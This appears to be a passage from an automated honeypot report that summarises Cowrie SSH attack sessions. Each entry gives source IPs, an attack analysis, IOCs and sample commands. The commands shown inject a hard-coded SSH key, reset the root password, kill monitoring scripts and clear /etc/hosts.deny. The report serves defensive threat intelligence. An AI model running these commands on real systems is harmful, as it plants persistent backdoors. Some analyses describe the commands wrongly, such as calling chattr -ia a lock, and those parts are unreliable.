cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:AlPIGmUrEKfD"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 4693ea5a505d...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.218.240.181

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise (remote access via SSH).

**2. Objective:**  
Gain persistent remote control of the system by injecting an SSH public key into `~/.ssh/authorized_keys` and resetting the root password.

**3. Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `mkdir`, `chmod`) to secure the key file.
- Direct injection of a hard‑coded RSA public key into `authorized_keys`.
- Password reset via `chpasswd` (root:08ezDT0lKS8P).
- Process termination and host denial modification to hide activity (`pkill -9`, `echo > /etc/hosts.deny`).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **103.218.240.181**  
- RSA public key string in the command: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File paths: `~/.ssh/authorized_keys`, `/etc/hosts.deny`.

**5. Threat Level:** **High** – root password change and SSH key injection provide full remote control.

**6. Brief Summary:**  
The attacker injected a hard‑coded RSA public key into the system’s SSH authorized keys and reset the root password, establishing a persistent backdoor for remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:08ezDT0lKS8P"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
... (+10 more)
```

---

### Pattern: 7dfbe87d0d85...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.218.138

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection)  
**Objective:** Gain remote access via SSH on the honeypot.  
**Techniques:**  
- Created/modified `.ssh` directory, set restrictive permissions (`chattr -ia`, `lockr -ia`).  
- Injected a public RSA key into `/home/.ssh/authorized_keys`.  
- Attempted to change user password via `passwd` (echo‑pipe).  
- Executed system‑info commands for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.218.138** (Singapore)  
- Public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `/home/.ssh/authorized_keys`  

**Threat Level:** Medium – the attacker successfully installed a backdoor but did not execute further malicious payloads.  

**Brief Summary:** The attacker injected an SSH public key into the honeypot’s `authorized_keys`, set restrictive permissions, and performed basic system reconnaissance to facilitate remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\n9ay4D52hqnQ1\n9ay4D52hqnQ1"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\n9ay4D52hqnQ1\n9ay4D52hqnQ1\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 8dd6bead0001...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.162.232

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Gain remote shell access via a new SSH key and gather host details for future exploitation or botnet recruitment.  

**Techniques Used:**  
- `chattr -ia`, `lockr` to lock the `.ssh` directory,  
- `rm -rf .ssh; mkdir .ssh; echo … > .ssh/authorized_keys` to inject a public key,  
- `chmod -R go= ~/.ssh` to restrict permissions,  
- System‑info commands (`cat /proc/cpuinfo`, `free -m`, `ls`, `top`, `uname`, `whoami`, `lscpu`, `df`) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.162.232**  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: **`.ssh/authorized_keys`**  

**Threat Level:** Medium–High (backdoor installation with system reconnaissance).  

**Brief Summary:** The attacker injected a new SSH key into the honeypot’s `.ssh` directory,

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "12345678\nBXWVCA6bwvJg\nBXWVCA6bwvJg"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "12345678\nBXWVCA6bwvJg\nBXWVCA6bwvJg\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+8 more)
```

---

### Pattern: e2cb1cb4f6b8...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 92.207.4.157

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection + system reconnaissance.

**Objective:**  
Create a remote access point for future exploitation while gathering host information (CPU, memory, OS details) to assess suitability for further attacks or botnet recruitment.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` to hide the `.ssh` directory and its contents.
- Creation of a new `.ssh` directory and injection of an SSH public key into `authorized_keys`.
- Permission changes (`chmod -R go= ~/.ssh`) to restrict group access.
- System information gathering: `/proc/cpuinfo`, `free -m`, `uname`, `lscpu`, `df`, `crontab`, `whoami`, and `w` commands.
- Attempted password change via `passwd` (though likely ineffective).

**Indicators of Compromise (IOCs):**
- Attacker IP: **92.207.4.157**  
- Injected SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kN

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nCf7tg8iu0O1D\nCf7tg8iu0O1D"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nCf7tg8iu0O1D\nCf7tg8iu0O1D\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 47cfc30452a6...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.162.232

#### Analysis

**Attack Type:**  
Backdoor installation (SSH key injection + root password change) with reconnaissance.

**Objective:**  
Gain persistent remote access by adding an SSH public‑key to the honeypot’s `authorized_keys` and resetting the root password. The attacker also collects system information for further exploitation or profiling.

**Techniques & Tools:**
- **SSH Key Injection** – `echo … > ~/.ssh/authorized_keys`
- **Root Password Reset** – `chpasswd` with a new password
- **File Attribute Locking** – `lockr -ia .ssh` (likely to prevent tampering)
- **Process Termination & Hiding** – `pkill -9 secure.sh`, `pkill -9 auth.sh`, `pkill -9 sleep`
- **System Reconnaissance** – CPU info, memory usage, file listings, crontab, uptime (`w`), uname, top, lscpu, disk usage.

**Indicators of Compromise (IOCs):**
- Attacker IP: 101.47.162.232
- RSA public key string (the long `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...` value)
- File paths manipulated: `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`
- Commands used: `lockr -ia .ssh`, `chpasswd`, `pkill -9`

**Threat Level:** High – the attacker gained root-level access and installed a persistent backdoor.

**Brief Summary:**  
The attacker injected an SSH key into the honeypot’s authorized_keys, reset the root password, and performed system reconnaissance to facilitate future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:UjvgDzgHoY4L"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+9 more)
```

---

### Pattern: 7e55a633e2a7...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 178.217.173.50

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection)

**Objective:** Gain remote access to the system via a newly created SSH key, enabling future exploitation or persistence.

**Techniques & Tools Used:**
- `chattr -ia`, `lockr -ia` – attempt to lock and set immutable attributes on `.ssh`.
- Creation of `.ssh` directory, removal of existing keys, and insertion of an arbitrary RSA public key.
- `chmod -R go= ~/.ssh` – restrict permissions to prevent other users from accessing the key.
- Password manipulation attempts (`passwd`) – likely to change user credentials or test password strength.

**Indicators of Compromise (IOCs):**
- Attacker IP: **178.217.173.50**  
- SSH public key string (RSA key) embedded in the command:
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File path: `~/.ssh/authorized_keys`

**Threat Level:** **High** – the attacker successfully installed an unauthorized SSH key, providing persistent remote access and potential for further exploitation.

**Brief Summary:** The attacker injected a rogue SSH public key into the system’s authorized keys file, effectively establishing a backdoor for future remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "cockpit\nrFBrfwrcKOTK\nrFBrfwrcKOTK"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "cockpit\nrFBrfwrcKOTK\nrFBrfwrcKOTK\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 2c0175eed258...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.218.240.181

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the system through a new SSH account.  
**Techniques:**  
- `chattr`/`lockr` to lock `.ssh` directory, preventing tampering.  
- Creation of `.ssh` and insertion of an RSA public key into `authorized_keys`.  
- Permission changes (`chmod -R go= ~/.ssh`) to restrict access.  
- System reconnaissance commands (CPU info, memory usage, disk stats, etc.) to gather host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.218.240.181** (Hong Kong).  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`.  

**Threat Level:** **High** – direct SSH access with potential for full system compromise.  
**Brief Summary:** The attacker injected a malicious SSH key into the honeypot’s `.ssh` directory, securing remote login capability while also collecting basic host information.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\nYHBpj631i2mr\nYHBpj631i2mr"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\nYHBpj631i2mr\nYHBpj631i2mr\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 07ab99790796...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.28.57.98

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Establish a persistent SSH entry point for future exploitation while collecting system information.  

**Techniques Used:**  
- **SSH Key Injection** – `echo "ssh-rsa …" > ~/.ssh/authorized_keys`  
- **Immutable File Protection** – `chattr -ia .ssh` and `lockr -ia .ssh` to prevent deletion or modification of the SSH directory.  
- **Root Password Change** – `echo "root:zpCQ5LtMgO5Y"|chpasswd|bash` (attempt

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:zpCQ5LtMgO5Y"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 7644c1927257...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.218.240.181

#### Analysis

**Attack Type:** Backdoor installation (potential botnet recruitment)

**Objective:** Establish persistent remote access via SSH by injecting a valid public key, securing the `.ssh` directory, and gathering system information for further exploitation or reconnaissance.

**Techniques:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys`
- **Immutable Attribute Setting** – `chattr -ia .ssh` to prevent tampering
- **Password Manipulation** – attempts to change the Unix password via `passwd` with echoed input
- **System Reconnaissance** – commands querying CPU, memory, OS details (`cat /proc/cpuinfo`, `free`, `uname`, etc.)

**Indicators of Compromise (IOCs):**
- IP: 103.218.240.181 (Hong Kong)
- Public SSH key string in the session
- Commands targeting `.ssh` directory and setting immutable attributes

**Threat Level:** Medium–High – the attacker is installing a backdoor with protective measures, indicating potential for persistent compromise.

**Brief Summary:** The attacker injected an SSH public key into the host’s `authorized_keys`, secured the `.ssh` folder with immutable attributes, and performed system reconnaissance to facilitate future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "12345678\nwjs4tLK5VbDp\nwjs4tLK5VbDp"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "12345678\nwjs4tLK5VbDp\nwjs4tLK5VbDp\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 40b6d48b4698...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.28.57.98

#### Analysis

**Attack Type:** Backdoor / botnet recruitment  
**Objective:** Gain privileged (root) access on the target machine by installing an SSH key and resetting the root password, then gather basic system information for future exploitation.  

**Techniques Used:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys` to add a hard‑coded RSA key.
- **Root Password Reset** – `echo "root:cK8fS442HoTW"|chpasswd|bash`.
- **Process Termination & Denial of Service** – `pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep` to remove potential monitoring scripts.
- **System Reconnaissance** – various `cat /proc/cpuinfo`, `free`, `ls`, `uname`, `top`, `df` commands to collect CPU, memory, and disk details.

**Indicators of Compromise (IOCs):**
- Attacker IP: 103.28.57.98  
- Injected RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Root password: `cK8fS442HoTW`  

**Threat Level:** **High** – attacker achieved root access and installed a persistent backdoor, enabling future exploitation or botnet participation.  

**Brief Summary:** The attacker injected an SSH key and reset the root password to gain full control of the system, while collecting basic hardware information for further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:cK8fS442HoTW"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: d285740b5b33...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.28.57.98

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection + system reconnaissance

**Objective:**  
Gain persistent remote access by adding a malicious SSH key to the host’s authorized_keys and enabling root login; gather system details for further exploitation or profiling.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia`: attempt to make `.ssh` directory immutable.
- `rm -rf .ssh && mkdir .ssh` + `echo … > .ssh/authorized_keys`: inject a rogue SSH key.
- `chmod -R go= ~/.ssh`: restrict permissions on the SSH directory.
- `chpasswd` with root password “YGkTtXWvvbF6” to set new root credentials.


#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:YGkTtXWvvbF6"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 79ed855085fd...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 112.216.120.67

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Install an unauthorized SSH key to gain remote access and collect host details (CPU, memory, disk).  
**Techniques:**  
- Manipulation of `.ssh` directory (`rm`, `mkdir`, `chmod`) and injection of a public key.  
- Use of system commands (`cat /proc/cpuinfo`, `free -m`, `df -h`, `uname`, etc.) to gather hardware/OS info.  
- Attempted password change via `passwd` (echo‑pipe).  

**Indicators of Compromise (IOCs):**  
- IP: **112.216.120.67** (South Korea)  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ... mdrfckr`  
- File path: `.ssh/authorized_keys`  

**Threat Level:** Medium – moderate sophistication, potential for remote exploitation.  

**Brief Summary:** The attacker injected an unauthorized SSH key into the honeypot’s `~/.ssh/authorized_keys` file while gathering system information to assess host capabilities, indicating a backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\nO2gVDXGxyW66\nO2gVDXGxyW66"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\nO2gVDXGxyW66\nO2gVDXGxyW66\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 2875faafc175...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 199.195.253.95

#### Analysis

**Attack Type:** Backdoor installation (remote access via SSH).  
**Objective:** Gain persistent remote control of the system by installing an SSH key and resetting the root password.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`).  
- Injection of a hard‑coded RSA public key into `authorized_keys`.  
- Password reset via `chpasswd`.  
- Process termination (`pkill -9`) and host denial file creation.  
**Indicators of Compromise (IOCs):**  
- IP: 199.195.253.95  
- RSA public key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”).  
- Root password set to “h3wtow9eNzjL”.  
**Threat Level:** High – the attacker has full remote access and can execute arbitrary commands.  
**Brief Summary:** The attacker installed an SSH backdoor by adding a hard‑coded RSA key and resetting the root password, enabling persistent remote control of the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:h3wtow9eNzjL"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 5fc67ba6b992...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.218.240.181

#### Analysis

**Attack Type:** Backdoor installation (credential theft & privilege escalation)

**Objective:** Gain privileged access on the target system by installing an SSH key and resetting the root password.

**Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`, `echo` to create `authorized_keys`)
- Injection of a hard‑coded RSA public key
- Root password reset via `chpasswd`
- Process termination (`pkill`) and host denial modification to hide activity

**Indicators of Compromise (IOCs):**
- Attacker IP: **103.218.240.181**  
- Hard‑coded RSA public key string (visible in command 3)  
- Target system commands (e.g., `uname`, `top`, `df`) used for reconnaissance

**Threat Level:** **High** – the attacker successfully installed a backdoor and altered root credentials, enabling full control.

**Brief Summary:** The attacker injected an SSH key into the target’s `.ssh` directory, reset the root password, and killed processes to conceal activity, effectively establishing a privileged backdoor on the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:uSPT6ZMJunS0"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 7e89d9b0bb63...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 199.195.253.95

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection and privilege escalation attempt.

**Objective:**  
Gain remote access through SSH by adding a malicious key to `authorized_keys`, then potentially elevate privileges by changing the system’s user password.

**Techniques & Tools Used:**
- **SSH Key Injection** – `echo "ssh-rsa …" > .ssh/authorized_keys` and permission changes (`chmod -R go= ~/.ssh`).  
- **Password Manipulation** – multiple `passwd` attempts with passwords “cockpit” and “aVSPkFmWVelx”.  
- **System Reconnaissance** – commands such as `uname`, `cat /proc/cpuinfo`, `free`, `top`, `lscpu`, `df`, etc.  
- **File Attribute Locking** – use of `chattr -ia` and `lockr -ia` on `.ssh`.

